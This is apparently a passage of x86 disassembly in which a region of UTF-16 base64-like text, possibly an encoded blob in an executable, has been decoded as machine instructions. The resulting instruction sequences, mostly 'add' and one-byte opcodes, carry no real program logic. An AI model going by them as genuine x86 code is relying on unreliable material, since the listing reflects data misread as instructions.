  40ab42:	69 00 61 00 78 00    	imul   $0x780061,(%eax),%eax
  40ab48:	4d                   	dec    %ebp
  40ab49:	00 57 00             	add    %dl,0x0(%edi)
  40ab4c:	61                   	popa
  40ab4d:	00 6a 00             	add    %ch,0x0(%edx)
  40ab50:	45                   	inc    %ebp
  40ab51:	00 44 00 70          	add    %al,0x70(%eax,%eax,1)
  40ab55:	00 78 00             	add    %bh,0x0(%eax)
  40ab58:	4c                   	dec    %esp
  40ab59:	00 43 00             	add    %al,0x0(%ebx)
  40ab5c:	4a                   	dec    %edx
  40ab5d:	00 73 00             	add    %dh,0x0(%ebx)
  40ab60:	31 00                	xor    %eax,(%eax)
  40ab62:	61                   	popa
  40ab63:	00 48 00             	add    %cl,0x0(%eax)
  40ab66:	50                   	push   %eax
  40ab67:	00 39                	add    %bh,(%ecx)
  40ab69:	00 48 00             	add    %cl,0x0(%eax)
  40ab6c:	63 00                	arpl   %eax,(%eax)
  40ab6e:	42                   	inc    %edx
  40ab6f:	00 71 00             	add    %dh,0x0(%ecx)
  40ab72:	42                   	inc    %edx
  40ab73:	00 61 00             	add    %ah,0x0(%ecx)
  40ab76:	74 00                	je     0x40ab78
  40ab78:	5a                   	pop    %edx
  40ab79:	00 42 00             	add    %al,0x0(%edx)
  40ab7c:	48                   	dec    %eax
  40ab7d:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ab80:	42                   	inc    %edx
  40ab81:	00 31                	add    %dh,(%ecx)
  40ab83:	00 65 00             	add    %ah,0x0(%ebp)
  40ab86:	64 00 46 00          	add    %al,%fs:0x0(%esi)
  40ab8a:	71 00                	jno    0x40ab8c
  40ab8c:	67 00 41 00          	add    %al,0x0(%bx,%di)
  40ab90:	46                   	inc    %esi
  40ab91:	00 57 00             	add    %dl,0x0(%edi)
  40ab94:	2b 00                	sub    (%eax),%eax
  40ab96:	77 00                	ja     0x40ab98
  40ab98:	71 00                	jno    0x40ab9a
  40ab9a:	4f                   	dec    %edi
  40ab9b:	00 66 00             	add    %ah,0x0(%esi)
  40ab9e:	39 00                	cmp    %eax,(%eax)
  40aba0:	5a                   	pop    %edx
  40aba1:	00 66 00             	add    %ah,0x0(%esi)
  40aba4:	51                   	push   %ecx
  40aba5:	00 42 00             	add    %al,0x0(%edx)
  40aba8:	6a 00                	push   $0x0
  40abaa:	42                   	inc    %edx
  40abab:	00 6b 00             	add    %ch,0x0(%ebx)
  40abae:	5a                   	pop    %edx
  40abaf:	00 46 00             	add    %al,0x0(%esi)
  40abb2:	66 00 63 00          	data16 add %ah,0x0(%ebx)
  40abb6:	62 00                	bound  %eax,(%eax)
  40abb8:	65 00 6f 00          	add    %ch,%gs:0x0(%edi)
  40abbc:	4d                   	dec    %ebp
  40abbd:	00 31                	add    %dh,(%ecx)
  40abbf:	00 4b 00             	add    %cl,0x0(%ebx)
  40abc2:	6c                   	insb   (%dx),%es:(%edi)
  40abc3:	00 43 00             	add    %al,0x0(%ebx)
  40abc6:	56                   	push   %esi
  40abc7:	00 56 00             	add    %dl,0x0(%esi)
  40abca:	74 00                	je     0x40abcc
  40abcc:	45                   	inc    %ebp
  40abcd:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  40abd1:	00 31                	add    %dh,(%ecx)
  40abd3:	00 71 00             	add    %dh,0x0(%ecx)
  40abd6:	4e                   	dec    %esi
  40abd7:	00 4b 00             	add    %cl,0x0(%ebx)
  40abda:	6f                   	outsl  %ds:(%esi),(%dx)
  40abdb:	00 6e 00             	add    %ch,0x0(%esi)
  40abde:	64 00 48 00          	add    %cl,%fs:0x0(%eax)
  40abe2:	6b 00 59             	imul   $0x59,(%eax),%eax
  40abe5:	00 36                	add    %dh,(%esi)
  40abe7:	00 4e 00             	add    %cl,0x0(%esi)
  40abea:	67 00 71 00          	add    %dh,0x0(%bx,%di)
  40abee:	6d                   	insl   (%dx),%es:(%edi)
  40abef:	00 32                	add    %dh,(%edx)
  40abf1:	00 6d 00             	add    %ch,0x0(%ebp)
  40abf4:	45                   	inc    %ebp
  40abf5:	00 39                	add    %bh,(%ecx)
  40abf7:	00 76 00             	add    %dh,0x0(%esi)
  40abfa:	43                   	inc    %ebx
  40abfb:	00 41 00             	add    %al,0x0(%ecx)
  40abfe:	45                   	inc    %ebp
  40abff:	00 6d 00             	add    %ch,0x0(%ebp)
  40ac02:	42                   	inc    %edx
  40ac03:	00 77 00             	add    %dh,0x0(%edi)
  40ac06:	75 00                	jne    0x40ac08
  40ac08:	55                   	push   %ebp
  40ac09:	00 4b 00             	add    %cl,0x0(%ebx)
  40ac0c:	62 00                	bound  %eax,(%eax)
  40ac0e:	42                   	inc    %edx
  40ac0f:	00 37                	add    %dh,(%edi)
  40ac11:	00 43 00             	add    %al,0x0(%ebx)
  40ac14:	38 00                	cmp    %al,(%eax)
  40ac16:	4e                   	dec    %esi
  40ac17:	00 65 00             	add    %ah,0x0(%ebp)
  40ac1a:	2f                   	das
  40ac1b:	00 2f                	add    %ch,(%edi)
  40ac1d:	00 6a 00             	add    %ch,0x0(%edx)
  40ac20:	70 00                	jo     0x40ac22
  40ac22:	30 00                	xor    %al,(%eax)
  40ac24:	66 00 34 00          	data16 add %dh,(%eax,%eax,1)
  40ac28:	71 00                	jno    0x40ac2a
  40ac2a:	6a 00                	push   $0x0
  40ac2c:	5a                   	pop    %edx
  40ac2d:	00 41 00             	add    %al,0x0(%ecx)
  40ac30:	51                   	push   %ecx
  40ac31:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ac34:	00 87 b1 47 00 76    	add    %al,0x760047b1(%edi)
  40ac3a:	00 6b 00             	add    %ch,0x0(%ebx)
  40ac3d:	61                   	popa
  40ac3e:	00 30                	add    %dh,(%eax)
  40ac40:	00 61 00             	add    %ah,0x0(%ecx)
  40ac43:	41                   	inc    %ecx
  40ac44:	00 6d 00             	add    %ch,0x0(%ebp)
  40ac47:	4f                   	dec    %edi
  40ac48:	00 31                	add    %dh,(%ecx)
  40ac4a:	00 4e 00             	add    %cl,0x0(%esi)
  40ac4d:	31 00                	xor    %eax,(%eax)
  40ac4f:	67 00 4a 00          	add    %cl,0x0(%bp,%si)
  40ac53:	32 00                	xor    (%eax),%al
  40ac55:	2f                   	das
  40ac56:	00 52 00             	add    %dl,0x0(%edx)
  40ac59:	52                   	push   %edx
  40ac5a:	00 6a 00             	add    %ch,0x0(%edx)
  40ac5d:	49                   	dec    %ecx
  40ac5e:	00 41 00             	add    %al,0x0(%ecx)
  40ac61:	39 00                	cmp    %eax,(%eax)
  40ac63:	52                   	push   %edx
  40ac64:	00 67 00             	add    %ah,0x0(%edi)
  40ac67:	77 00                	ja     0x40ac69
  40ac69:	2f                   	das
  40ac6a:	00 4a 00             	add    %cl,0x0(%edx)
  40ac6d:	61                   	popa
  40ac6e:	00 71 00             	add    %dh,0x0(%ecx)
  40ac71:	66 00 58 00          	data16 add %bl,0x0(%eax)
  40ac75:	50                   	push   %eax
  40ac76:	00 35 00 39 00 79    	add    %dh,0x79003900
  40ac7c:	00 6d 00             	add    %ch,0x0(%ebp)
  40ac7f:	54                   	push   %esp
  40ac80:	00 69 00             	add    %ch,0x0(%ecx)
  40ac83:	6b 00 54             	imul   $0x54,(%eax),%eax
  40ac86:	00 43 00             	add    %al,0x0(%ebx)
  40ac89:	2b 00                	sub    (%eax),%eax
  40ac8b:	57                   	push   %edi
  40ac8c:	00 5a 00             	add    %bl,0x0(%edx)
  40ac8f:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac90:	00 67 00             	add    %ah,0x0(%edi)
  40ac93:	55                   	push   %ebp
  40ac94:	00 63 00             	add    %ah,0x0(%ebx)
  40ac97:	36 00 50 00          	add    %dl,%ss:0x0(%eax)
  40ac9b:	37                   	aaa
  40ac9c:	00 72 00             	add    %dh,0x0(%edx)
  40ac9f:	34 00                	xor    $0x0,%al
  40aca1:	61                   	popa
  40aca2:	00 63 00             	add    %ah,0x0(%ebx)
  40aca5:	48                   	dec    %eax
  40aca6:	00 5a 00             	add    %bl,0x0(%edx)
  40aca9:	37                   	aaa
  40acaa:	00 42 00             	add    %al,0x0(%edx)
  40acad:	4e                   	dec    %esi
  40acae:	00 75 00             	add    %dh,0x0(%ebp)
  40acb1:	52                   	push   %edx
  40acb2:	00 33                	add    %dh,(%ebx)
  40acb4:	00 6e 00             	add    %ch,0x0(%esi)
  40acb7:	4e                   	dec    %esi
  40acb8:	00 6a 00             	add    %ch,0x0(%edx)
  40acbb:	75 00                	jne    0x40acbd
  40acbd:	47                   	inc    %edi
  40acbe:	00 56 00             	add    %dl,0x0(%esi)
  40acc1:	61                   	popa
  40acc2:	00 36                	add    %dh,(%esi)
  40acc4:	00 6b 00             	add    %ch,0x0(%ebx)
  40acc7:	32 00                	xor    (%eax),%al
  40acc9:	54                   	push   %esp
  40acca:	00 43 00             	add    %al,0x0(%ebx)
  40accd:	39 00                	cmp    %eax,(%eax)
  40accf:	33 00                	xor    (%eax),%eax
  40acd1:	53                   	push   %ebx
  40acd2:	00 64 00 4b          	add    %ah,0x4b(%eax,%eax,1)
  40acd6:	00 6a 00             	add    %ch,0x0(%edx)
  40acd9:	67 00 30             	add    %dh,(%bx,%si)
  40acdc:	00 6d 00             	add    %ch,0x0(%ebp)
  40acdf:	37                   	aaa
  40ace0:	00 67 00             	add    %ah,0x0(%edi)
  40ace3:	72 00                	jb     0x40ace5
  40ace5:	58                   	pop    %eax
  40ace6:	00 66 00             	add    %ah,0x0(%esi)
  40ace9:	46                   	inc    %esi
  40acea:	00 50 00             	add    %dl,0x0(%eax)
  40aced:	47                   	inc    %edi
  40acee:	00 48 00             	add    %cl,0x0(%eax)
  40acf1:	43                   	inc    %ebx
  40acf2:	00 36                	add    %dh,(%esi)
  40acf4:	00 2b                	add    %ch,(%ebx)
  40acf6:	00 41 00             	add    %al,0x0(%ecx)
  40acf9:	36 00 4f 00          	add    %cl,%ss:0x0(%edi)
  40acfd:	4d                   	dec    %ebp
  40acfe:	00 74 00 67          	add    %dh,0x67(%eax,%eax,1)
  40ad02:	00 6b 00             	add    %ch,0x0(%ebx)
  40ad05:	39 00                	cmp    %eax,(%eax)
  40ad07:	30 00                	xor    %al,(%eax)
  40ad09:	56                   	push   %esi
  40ad0a:	00 39                	add    %bh,(%ecx)
  40ad0c:	00 7a 00             	add    %bh,0x0(%edx)
  40ad0f:	77 00                	ja     0x40ad11
  40ad11:	55                   	push   %ebp
  40ad12:	00 57 00             	add    %dl,0x0(%edi)
  40ad15:	75 00                	jne    0x40ad17
  40ad17:	57                   	push   %edi
  40ad18:	00 4a 00             	add    %cl,0x0(%edx)
  40ad1b:	41                   	inc    %ecx
  40ad1c:	00 72 00             	add    %dh,0x0(%edx)
  40ad1f:	75 00                	jne    0x40ad21
  40ad21:	71 00                	jno    0x40ad23
  40ad23:	4e                   	dec    %esi
  40ad24:	00 78 00             	add    %bh,0x0(%eax)
  40ad27:	53                   	push   %ebx
  40ad28:	00 2f                	add    %ch,(%edi)
  40ad2a:	00 56 00             	add    %dl,0x0(%esi)
  40ad2d:	6d                   	insl   (%dx),%es:(%edi)
  40ad2e:	00 72 00             	add    %dh,0x0(%edx)
  40ad31:	6e                   	outsb  %ds:(%esi),(%dx)
  40ad32:	00 51 00             	add    %dl,0x0(%ecx)
  40ad35:	34 00                	xor    $0x0,%al
  40ad37:	39 00                	cmp    %eax,(%eax)
  40ad39:	51                   	push   %ecx
  40ad3a:	00 41 00             	add    %al,0x0(%ecx)
  40ad3d:	47                   	inc    %edi
  40ad3e:	00 66 00             	add    %ah,0x0(%esi)
  40ad41:	52                   	push   %edx
  40ad42:	00 2f                	add    %ch,(%edi)
  40ad44:	00 42 00             	add    %al,0x0(%edx)
  40ad47:	61                   	popa
  40ad48:	00 7a 00             	add    %bh,0x0(%edx)
  40ad4b:	57                   	push   %edi
  40ad4c:	00 36                	add    %dh,(%esi)
  40ad4e:	00 47 00             	add    %al,0x0(%edi)
  40ad51:	42                   	inc    %edx
  40ad52:	00 74 00 35          	add    %dh,0x35(%eax,%eax,1)
  40ad56:	00 78 00             	add    %bh,0x0(%eax)
  40ad59:	6d                   	insl   (%dx),%es:(%edi)
  40ad5a:	00 67 00             	add    %ah,0x0(%edi)
  40ad5d:	6b 00 4a             	imul   $0x4a,(%eax),%eax
  40ad60:	00 54 00 2f          	add    %dl,0x2f(%eax,%eax,1)
  40ad64:	00 2f                	add    %ch,(%edi)
  40ad66:	00 33                	add    %dh,(%ebx)
  40ad68:	00 62 00             	add    %ah,0x0(%edx)
  40ad6b:	52                   	push   %edx
  40ad6c:	00 5a 00             	add    %bl,0x0(%edx)
  40ad6f:	6c                   	insb   (%dx),%es:(%edi)
  40ad70:	00 47 00             	add    %al,0x0(%edi)
  40ad73:	42                   	inc    %edx
  40ad74:	00 75 00             	add    %dh,0x0(%ebp)
  40ad77:	62 00                	bound  %eax,(%eax)
  40ad79:	55                   	push   %ebp
  40ad7a:	00 50 00             	add    %dl,0x0(%eax)
  40ad7d:	31 00                	xor    %eax,(%eax)
  40ad7f:	37                   	aaa
  40ad80:	00 6b 00             	add    %ch,0x0(%ebx)
  40ad83:	43                   	inc    %ebx
  40ad84:	00 5a 00             	add    %bl,0x0(%edx)
  40ad87:	75 00                	jne    0x40ad89
  40ad89:	30 00                	xor    %al,(%eax)
  40ad8b:	57                   	push   %edi
  40ad8c:	00 49 00             	add    %cl,0x0(%ecx)
  40ad8f:	32 00                	xor    (%eax),%al
  40ad91:	44                   	inc    %esp
  40ad92:	00 77 00             	add    %dh,0x0(%edi)
  40ad95:	53                   	push   %ebx
  40ad96:	00 37                	add    %dh,(%edi)
  40ad98:	00 57 00             	add    %dl,0x0(%edi)
  40ad9b:	6d                   	insl   (%dx),%es:(%edi)
  40ad9c:	00 37                	add    %dh,(%edi)
  40ad9e:	00 69 00             	add    %ch,0x0(%ecx)
  40ada1:	68 00 47 00 59       	push   $0x59004700
  40ada6:	00 69 00             	add    %ch,0x0(%ecx)
  40ada9:	38 00                	cmp    %al,(%eax)
  40adab:	71 00                	jno    0x40adad
  40adad:	41                   	inc    %ecx
  40adae:	00 51 00             	add    %dl,0x0(%ecx)
  40adb1:	64 00 37             	add    %dh,%fs:(%edi)
  40adb4:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  40adb8:	00 76 00             	add    %dh,0x0(%esi)
  40adbb:	72 00                	jb     0x40adbd
  40adbd:	73 00                	jae    0x40adbf
  40adbf:	58                   	pop    %eax
  40adc0:	00 33                	add    %dh,(%ebx)
  40adc2:	00 79 00             	add    %bh,0x0(%ecx)
  40adc5:	55                   	push   %ebp
  40adc6:	00 55 00             	add    %dl,0x0(%ebp)
  40adc9:	77 00                	ja     0x40adcb
  40adcb:	45                   	inc    %ebp
  40adcc:	00 46 00             	add    %al,0x0(%esi)
  40adcf:	33 00                	xor    (%eax),%eax
  40add1:	61                   	popa
  40add2:	00 4a 00             	add    %cl,0x0(%edx)
  40add5:	55                   	push   %ebp
  40add6:	00 31                	add    %dh,(%ecx)
  40add8:	00 44 00 6e          	add    %al,0x6e(%eax,%eax,1)
  40addc:	00 33                	add    %dh,(%ebx)
  40adde:	00 32                	add    %dh,(%edx)
  40ade0:	00 43 00             	add    %al,0x0(%ebx)
  40ade3:	4b                   	dec    %ebx
  40ade4:	00 2f                	add    %ch,(%edi)
  40ade6:	00 74 00 55          	add    %dh,0x55(%eax,%eax,1)
  40adea:	00 70 00             	add    %dh,0x0(%eax)
  40aded:	4a                   	dec    %edx
  40adee:	00 39                	add    %bh,(%ecx)
  40adf0:	00 66 00             	add    %ah,0x0(%esi)
  40adf3:	45                   	inc    %ebp
  40adf4:	00 6f 00             	add    %ch,0x0(%edi)
  40adf7:	32 00                	xor    (%eax),%al
  40adf9:	37                   	aaa
  40adfa:	00 57 00             	add    %dl,0x0(%edi)
  40adfd:	34 00                	xor    $0x0,%al
  40adff:	64 00 4f 00          	add    %cl,%fs:0x0(%edi)
  40ae03:	59                   	pop    %ecx
  40ae04:	00 39                	add    %bh,(%ecx)
  40ae06:	00 74 00 6a          	add    %dh,0x6a(%eax,%eax,1)
  40ae0a:	00 6b 00             	add    %ch,0x0(%ebx)
  40ae0d:	6b 00 6d             	imul   $0x6d,(%eax),%eax
  40ae10:	00 4b 00             	add    %cl,0x0(%ebx)
  40ae13:	5a                   	pop    %edx
  40ae14:	00 64 00 6a          	add    %ah,0x6a(%eax,%eax,1)
  40ae18:	00 61 00             	add    %ah,0x0(%ecx)
  40ae1b:	31 00                	xor    %eax,(%eax)
  40ae1d:	31 00                	xor    %eax,(%eax)
  40ae1f:	2b 00                	sub    (%eax),%eax
  40ae21:	70 00                	jo     0x40ae23
  40ae23:	34 00                	xor    $0x0,%al
  40ae25:	63 00                	arpl   %eax,(%eax)
  40ae27:	50                   	push   %eax
  40ae28:	00 37                	add    %dh,(%edi)
  40ae2a:	00 44 00 50          	add    %al,0x50(%eax,%eax,1)
  40ae2e:	00 4b 00             	add    %cl,0x0(%ebx)
  40ae31:	55                   	push   %ebp
  40ae32:	00 53 00             	add    %dl,0x0(%ebx)
  40ae35:	65 00 4c 00 69       	add    %cl,%gs:0x69(%eax,%eax,1)
  40ae3a:	00 2b                	add    %ch,(%ebx)
  40ae3c:	00 79 00             	add    %bh,0x0(%ecx)
  40ae3f:	54                   	push   %esp
  40ae40:	00 49 00             	add    %cl,0x0(%ecx)
  40ae43:	4d                   	dec    %ebp
  40ae44:	00 70 00             	add    %dh,0x0(%eax)
  40ae47:	76 00                	jbe    0x40ae49
  40ae49:	33 00                	xor    (%eax),%eax
  40ae4b:	33 00                	xor    (%eax),%eax
  40ae4d:	61                   	popa
  40ae4e:	00 62 00             	add    %ah,0x0(%edx)
  40ae51:	58                   	pop    %eax
  40ae52:	00 72 00             	add    %dh,0x0(%edx)
  40ae55:	79 00                	jns    0x40ae57
  40ae57:	6b 00 4d             	imul   $0x4d,(%eax),%eax
  40ae5a:	00 54 00 71          	add    %dl,0x71(%eax,%eax,1)
  40ae5e:	00 39                	add    %bh,(%ecx)
  40ae60:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ae63:	37                   	aaa
  40ae64:	00 7a 00             	add    %bh,0x0(%edx)
  40ae67:	58                   	pop    %eax
  40ae68:	00 48 00             	add    %cl,0x0(%eax)
  40ae6b:	64 00 75 00          	add    %dh,%fs:0x0(%ebp)
  40ae6f:	79 00                	jns    0x40ae71
  40ae71:	2b 00                	sub    (%eax),%eax
  40ae73:	62 00                	bound  %eax,(%eax)
  40ae75:	7a 00                	jp     0x40ae77
  40ae77:	78 00                	js     0x40ae79
  40ae79:	43                   	inc    %ebx
  40ae7a:	00 4a 00             	add    %cl,0x0(%edx)
  40ae7d:	73 00                	jae    0x40ae7f
  40ae7f:	41                   	inc    %ecx
  40ae80:	00 61 00             	add    %ah,0x0(%ecx)
  40ae83:	46                   	inc    %esi
  40ae84:	00 6a 00             	add    %ch,0x0(%edx)
  40ae87:	36 00 31             	add    %dh,%ss:(%ecx)
  40ae8a:	00 79 00             	add    %bh,0x0(%ecx)
  40ae8d:	4a                   	dec    %edx
  40ae8e:	00 64 00 6a          	add    %ah,0x6a(%eax,%eax,1)
  40ae92:	00 38                	add    %bh,(%eax)
  40ae94:	00 6a 00             	add    %ch,0x0(%edx)
  40ae97:	43                   	inc    %ebx
  40ae98:	00 6c 00 5a          	add    %ch,0x5a(%eax,%eax,1)
  40ae9c:	00 6f 00             	add    %ch,0x0(%edi)
  40ae9f:	4e                   	dec    %esi
  40aea0:	00 59 00             	add    %bl,0x0(%ecx)
  40aea3:	49                   	dec    %ecx
  40aea4:	00 52 00             	add    %dl,0x0(%edx)
  40aea7:	6a 00                	push   $0x0
  40aea9:	78 00                	js     0x40aeab
  40aeab:	32 00                	xor    (%eax),%al
  40aead:	70 00                	jo     0x40aeaf
  40aeaf:	4b                   	dec    %ebx
  40aeb0:	00 50 00             	add    %dl,0x0(%eax)
  40aeb3:	67 00 47 00          	add    %al,0x0(%bx)
  40aeb7:	75 00                	jne    0x40aeb9
  40aeb9:	78 00                	js     0x40aebb
  40aebb:	47                   	inc    %edi
  40aebc:	00 4e 00             	add    %cl,0x0(%esi)
  40aebf:	37                   	aaa
  40aec0:	00 58 00             	add    %bl,0x0(%eax)
  40aec3:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40aec7:	73 00                	jae    0x40aec9
  40aec9:	6f                   	outsl  %ds:(%esi),(%dx)
  40aeca:	00 46 00             	add    %al,0x0(%esi)
  40aecd:	67 00 6d 00          	add    %ch,0x0(%di)
  40aed1:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40aed5:	36 00 66 00          	add    %ah,%ss:0x0(%esi)
  40aed9:	61                   	popa
  40aeda:	00 64 00 2b          	add    %ah,0x2b(%eax,%eax,1)
  40aede:	00 4e 00             	add    %cl,0x0(%esi)
  40aee1:	32 00                	xor    (%eax),%al
  40aee3:	59                   	pop    %ecx
  40aee4:	00 57 00             	add    %dl,0x0(%edi)
  40aee7:	32 00                	xor    (%eax),%al
  40aee9:	42                   	inc    %edx
  40aeea:	00 57 00             	add    %dl,0x0(%edi)
  40aeed:	6c                   	insb   (%dx),%es:(%edi)
  40aeee:	00 72 00             	add    %dh,0x0(%edx)
  40aef1:	46                   	inc    %esi
  40aef2:	00 46 00             	add    %al,0x0(%esi)
  40aef5:	64 00 77 00          	add    %dh,%fs:0x0(%edi)
  40aef9:	2f                   	das
  40aefa:	00 4a 00             	add    %cl,0x0(%edx)
  40aefd:	6f                   	outsl  %ds:(%esi),(%dx)
  40aefe:	00 59 00             	add    %bl,0x0(%ecx)
  40af01:	58                   	pop    %eax
  40af02:	00 66 00             	add    %ah,0x0(%esi)
  40af05:	59                   	pop    %ecx
  40af06:	00 31                	add    %dh,(%ecx)
  40af08:	00 69 00             	add    %ch,0x0(%ecx)
  40af0b:	42                   	inc    %edx
  40af0c:	00 67 00             	add    %ah,0x0(%edi)
  40af0f:	70 00                	jo     0x40af11
  40af11:	72 00                	jb     0x40af13
  40af13:	48                   	dec    %eax
  40af14:	00 4e 00             	add    %cl,0x0(%esi)
  40af17:	37                   	aaa
  40af18:	00 72 00             	add    %dh,0x0(%edx)
  40af1b:	5a                   	pop    %edx
  40af1c:	00 4d 00             	add    %cl,0x0(%ebp)
  40af1f:	32 00                	xor    (%eax),%al
  40af21:	6a 00                	push   $0x0
  40af23:	66 00 65 00          	data16 add %ah,0x0(%ebp)
  40af27:	6b 00 50             	imul   $0x50,(%eax),%eax
  40af2a:	00 57 00             	add    %dl,0x0(%edi)
  40af2d:	75 00                	jne    0x40af2f
  40af2f:	71 00                	jno    0x40af31
  40af31:	6c                   	insb   (%dx),%es:(%edi)
  40af32:	00 39                	add    %bh,(%ecx)
  40af34:	00 55 00             	add    %dl,0x0(%ebp)
  40af37:	2f                   	das
  40af38:	00 61 00             	add    %ah,0x0(%ecx)
  40af3b:	33 00                	xor    (%eax),%eax
  40af3d:	67 00 32             	add    %dh,(%bp,%si)
  40af40:	00 4e 00             	add    %cl,0x0(%esi)
  40af43:	4f                   	dec    %edi
  40af44:	00 56 00             	add    %dl,0x0(%esi)
  40af47:	55                   	push   %ebp
  40af48:	00 4b 00             	add    %cl,0x0(%ebx)
  40af4b:	7a 00                	jp     0x40af4d
  40af4d:	54                   	push   %esp
  40af4e:	00 53 00             	add    %dl,0x0(%ebx)
  40af51:	62 00                	bound  %eax,(%eax)
  40af53:	54                   	push   %esp
  40af54:	00 2b                	add    %ch,(%ebx)
  40af56:	00 33                	add    %dh,(%ebx)
  40af58:	00 6e 00             	add    %ch,0x0(%esi)
  40af5b:	66 00 71 00          	data16 add %dh,0x0(%ecx)
  40af5f:	2f                   	das
  40af60:	00 64 00 4c          	add    %ah,0x4c(%eax,%eax,1)
  40af64:	00 70 00             	add    %dh,0x0(%eax)
  40af67:	35 00 45 00 66       	xor    $0x66004500,%eax
  40af6c:	00 33                	add    %dh,(%ebx)
  40af6e:	00 39                	add    %bh,(%ecx)
  40af70:	00 38                	add    %bh,(%eax)
  40af72:	00 78 00             	add    %bh,0x0(%eax)
  40af75:	38 00                	cmp    %al,(%eax)
  40af77:	46                   	inc    %esi
  40af78:	00 4b 00             	add    %cl,0x0(%ebx)
  40af7b:	30 00                	xor    %al,(%eax)
  40af7d:	77 00                	ja     0x40af7f
  40af7f:	54                   	push   %esp
  40af80:	00 65 00             	add    %ah,0x0(%ebp)
  40af83:	41                   	inc    %ecx
  40af84:	00 36                	add    %dh,(%esi)
  40af86:	00 55 00             	add    %dl,0x0(%ebp)
  40af89:	2f                   	das
  40af8a:	00 37                	add    %dh,(%edi)
  40af8c:	00 46 00             	add    %al,0x0(%esi)
  40af8f:	6e                   	outsb  %ds:(%esi),(%dx)
  40af90:	00 2b                	add    %ch,(%ebx)
  40af92:	00 32                	add    %dh,(%edx)
  40af94:	00 33                	add    %dh,(%ebx)
  40af96:	00 6d 00             	add    %ch,0x0(%ebp)
  40af99:	7a 00                	jp     0x40af9b
  40af9b:	52                   	push   %edx
  40af9c:	00 59 00             	add    %bl,0x0(%ecx)
  40af9f:	64 00 77 00          	add    %dh,%fs:0x0(%edi)
  40afa3:	33 00                	xor    (%eax),%eax
  40afa5:	72 00                	jb     0x40afa7
  40afa7:	67 00 79 00          	add    %bh,0x0(%bx,%di)
  40afab:	6b 00 79             	imul   $0x79,(%eax),%eax
  40afae:	00 36                	add    %dh,(%esi)
  40afb0:	00 45 00             	add    %al,0x0(%ebp)
  40afb3:	4b                   	dec    %ebx
  40afb4:	00 62 00             	add    %ah,0x0(%edx)
  40afb7:	47                   	inc    %edi
  40afb8:	00 75 00             	add    %dh,0x0(%ebp)
  40afbb:	79 00                	jns    0x40afbd
  40afbd:	6f                   	outsl  %ds:(%esi),(%dx)
  40afbe:	00 4e 00             	add    %cl,0x0(%esi)
  40afc1:	67 00 57 00          	add    %dl,0x0(%bx)
  40afc5:	6c                   	insb   (%dx),%es:(%edi)
  40afc6:	00 39                	add    %bh,(%ecx)
  40afc8:	00 51 00             	add    %dl,0x0(%ecx)
  40afcb:	4c                   	dec    %esp
  40afcc:	00 33                	add    %dh,(%ebx)
  40afce:	00 70 00             	add    %dh,0x0(%eax)
  40afd1:	63 00                	arpl   %eax,(%eax)
  40afd3:	59                   	pop    %ecx
  40afd4:	00 79 00             	add    %bh,0x0(%ecx)
  40afd7:	76 00                	jbe    0x40afd9
  40afd9:	75 00                	jne    0x40afdb
  40afdb:	37                   	aaa
  40afdc:	00 50 00             	add    %dl,0x0(%eax)
  40afdf:	67 00 51 00          	add    %dl,0x0(%bx,%di)
  40afe3:	43                   	inc    %ebx
  40afe4:	00 6f 00             	add    %ch,0x0(%edi)
  40afe7:	69 00 63 00 77 00    	imul   $0x770063,(%eax),%eax
  40afed:	69 00 30 00 6c 00    	imul   $0x6c0030,(%eax),%eax
  40aff3:	78 00                	js     0x40aff5
  40aff5:	71 00                	jno    0x40aff7
  40aff7:	53                   	push   %ebx
  40aff8:	00 70 00             	add    %dh,0x0(%eax)
  40affb:	37                   	aaa
  40affc:	00 44 00 4a          	add    %al,0x4a(%eax,%eax,1)
  40b000:	00 67 00             	add    %ah,0x0(%edi)
  40b003:	57                   	push   %edi
  40b004:	00 72 00             	add    %dh,0x0(%edx)
  40b007:	44                   	inc    %esp
  40b008:	00 5a 00             	add    %bl,0x0(%edx)
  40b00b:	44                   	inc    %esp
  40b00c:	00 45 00             	add    %al,0x0(%ebp)
  40b00f:	6c                   	insb   (%dx),%es:(%edi)
  40b010:	00 33                	add    %dh,(%ebx)
  40b012:	00 2b                	add    %ch,(%ebx)
  40b014:	00 62 00             	add    %ah,0x0(%edx)
  40b017:	6c                   	insb   (%dx),%es:(%edi)
  40b018:	00 68 00             	add    %ch,0x0(%eax)
  40b01b:	52                   	push   %edx
  40b01c:	00 69 00             	add    %ch,0x0(%ecx)
  40b01f:	51                   	push   %ecx
  40b020:	00 4d 00             	add    %cl,0x0(%ebp)
  40b023:	55                   	push   %ebp
  40b024:	00 4e 00             	add    %cl,0x0(%esi)
  40b027:	79 00                	jns    0x40b029
  40b029:	2b 00                	sub    (%eax),%eax
  40b02b:	42                   	inc    %edx
  40b02c:	00 4f 00             	add    %cl,0x0(%edi)
  40b02f:	34 00                	xor    $0x0,%al
  40b031:	79 00                	jns    0x40b033
  40b033:	67 00 53 00          	add    %dl,0x0(%bp,%di)
  40b037:	61                   	popa
  40b038:	00 59 00             	add    %bl,0x0(%ecx)
  40b03b:	55                   	push   %ebp
  40b03c:	00 76 00             	add    %dh,0x0(%esi)
  40b03f:	4f                   	dec    %edi
  40b040:	00 41 00             	add    %al,0x0(%ecx)
  40b043:	71 00                	jno    0x40b045
  40b045:	55                   	push   %ebp
  40b046:	00 2b                	add    %ch,(%ebx)
  40b048:	00 7a 00             	add    %bh,0x0(%edx)
  40b04b:	41                   	inc    %ecx
  40b04c:	00 2f                	add    %ch,(%edi)
  40b04e:	00 32                	add    %dh,(%edx)
  40b050:	00 45 00             	add    %al,0x0(%ebp)
  40b053:	36 00 30             	add    %dh,%ss:(%eax)
  40b056:	00 47 00             	add    %al,0x0(%edi)
  40b059:	4e                   	dec    %esi
  40b05a:	00 57 00             	add    %dl,0x0(%edi)
  40b05d:	52                   	push   %edx
  40b05e:	00 70 00             	add    %dh,0x0(%eax)
  40b061:	52                   	push   %edx
  40b062:	00 36                	add    %dh,(%esi)
  40b064:	00 6f 00             	add    %ch,0x0(%edi)
  40b067:	71 00                	jno    0x40b069
  40b069:	70 00                	jo     0x40b06b
  40b06b:	73 00                	jae    0x40b06d
  40b06d:	33 00                	xor    (%eax),%eax
  40b06f:	4e                   	dec    %esi
